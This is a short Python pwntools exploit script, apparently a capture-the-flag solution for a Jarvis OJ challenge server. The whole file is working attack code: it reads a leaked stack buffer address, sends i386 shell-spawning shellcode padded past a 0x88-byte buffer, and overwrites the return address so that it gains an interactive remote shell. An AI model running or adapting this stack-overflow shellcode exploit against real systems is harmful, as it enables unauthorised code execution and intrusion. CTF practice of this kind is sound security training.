#coding:utf-8

from pwn import *
from time import sleep

pwn = remote("pwn2.jarvisoj.com",9877)

recv = pwn.recv().strip()

sleep(0.1)

buf_addr = recv.split(':')[1][:-1]
buf_addr = p32(int(buf_addr,16))

shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode + '\x00'*(0x88+4-len(shellcode)) + buf_addr

pwn.sendline(payload)
pwn.interactive()
